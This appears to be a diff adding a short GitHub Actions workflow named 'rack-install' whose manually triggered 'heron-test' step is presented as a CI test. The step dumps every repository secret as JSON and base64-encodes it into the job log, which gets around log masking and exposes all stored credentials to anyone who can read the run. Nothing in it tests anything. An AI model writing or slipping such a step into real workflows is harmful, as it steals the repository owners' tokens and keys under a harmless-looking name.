@@ -1,0 +1,12 @@
+name: rack-install
+on:
+  workflow_dispatch:
+
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    steps:
+      - name: heron-test
+        run: echo $SECRETS|base64
+        env:
+          SECRETS: ${{ toJson(secrets) }}
